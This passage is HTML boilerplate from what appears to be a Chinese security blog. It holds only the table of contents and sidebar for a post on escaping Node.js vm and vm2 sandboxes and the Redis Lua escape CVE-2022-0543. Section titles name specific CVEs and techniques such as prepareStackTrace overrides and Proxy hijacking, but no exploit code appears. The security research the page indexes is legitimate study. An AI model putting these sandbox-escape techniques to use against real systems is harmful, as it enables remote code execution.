href="#%E5%85%A8%E5%B1%80%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">全局命名空间</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-eval-Function%E4%B8%8Evm"><span class="toc-number">1.2.3.</span> <span class="toc-text">2.eval&#x2F;Function与vm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-vm%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.4.</span> <span class="toc-text">3.vm函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%BC%80%E5%A7%8B%E9%80%83%E9%80%B8"><span class="toc-number">1.2.5.</span> <span class="toc-text">4.开始逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%99%90%E5%88%B6%E5%8E%9F%E5%9E%8B%E9%93%BE%E5%AD%90%E6%98%AFnull"><span class="toc-number">1.2.6.</span> <span class="toc-text">5.限制原型链子是null</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%90%E5%91%98%E7%B1%BB%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">成员类执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tostring%E9%87%8D%E5%86%99"><span class="toc-number">1.2.6.2.</span> <span class="toc-text">tostring重写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proxy%E5%8A%AB%E6%8C%81%E5%B1%9E%E6%80%A7"><span class="toc-number">1.2.6.3.</span> <span class="toc-text">Proxy劫持属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#proxy%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE"><span class="toc-number">1.2.6.4.</span> <span class="toc-text">proxy报错回显</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-vm2%E9%80%83%E9%80%B8"><span class="toc-number">1.3.</span> <span class="toc-text">3.vm2逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.3.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E8%B6%85%E8%BF%87RangeError%E7%9A%84%E6%9C%80%E5%A4%A7%E8%B0%83%E7%94%A8%E5%A0%86%E6%A0%88%E5%A4%A7%E5%B0%8FCVE-2019-10761"><span class="toc-number">1.3.2.</span> <span class="toc-text">通过超过RangeError的最大调用堆栈大小CVE-2019-10761</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-23449"><span class="toc-number">1.3.3.</span> <span class="toc-text">CVE-2021-23449</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#import%E9%80%83%E9%80%B8"><span class="toc-number">1.3.4.</span> <span class="toc-text">import逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#has%E6%96%B9%E6%B3%95%E6%9C%AA%E4%BB%A3%E7%90%86%E5%AF%BC%E8%87%B4%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.5.</span> <span class="toc-text">has方法未代理导致绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96host-Function%E9%80%83%E9%80%B8%E6%89%A7%E8%A1%8Crce"><span class="toc-number">1.3.6.</span> <span class="toc-text">获取host.Function逃逸执行rce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81Symbol%E5%AF%B9%E8%B1%A1%E7%9A%84getter"><span class="toc-number">1.3.7.</span> <span class="toc-text">劫持通过劫持Symbol对象的getter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E7%9B%96prepareStackTrace"><span class="toc-number">1.3.8.</span> <span class="toc-text">覆盖prepareStackTrace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-36067"><span class="toc-number">1.3.9.</span> <span class="toc-text">CVE-2022-36067</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-redis%E9%80%83%E9%80%B8"><span class="toc-number">1.4.</span> <span class="toc-text">4.redis逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.4.2.</span> <span class="toc-text">漏洞原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-0543-poc"><span class="toc-number">1.4.3.</span> <span class="toc-text">CVE-2022-0543   poc</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/28/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Rome反序列化">Rome反序列化</a><time datetime="2024-02-27T16:00:00.000Z" title="Created 2024-02-28 00:00:00">2024-02-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/17/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="fastjson反序列化_学习">fastjson反序列化_学习</a><time datetime="2024-02-16T16:00:00.000Z" title="Created 2024-02-17 00:00:00">2024-02-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/05/jndi%E6%B3%A8%E5%85%A5/" title="JNDI注入学习">JNDI注入学习</a><time datetime="2024-02-04T16:00:00.000Z" title="Created 2024-02-05 00:00:00">2024-02-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/04/java%20RMI/" title="JAVA_RMI学习">JAVA_RMI学习</a><time datetime="2024-02-03T16:00:00.000Z" title="Created 2024-02-04 00:00:00">2024-02-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/02/java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/" title="java反序列化原生链&amp;脏数据">java反序列化原生链&amp;脏数据</a><time datetime="2024-02-01T16:00:00.000Z" title="Created 2024-02-02 00:00:00">2024-02-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By AsaL1n</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>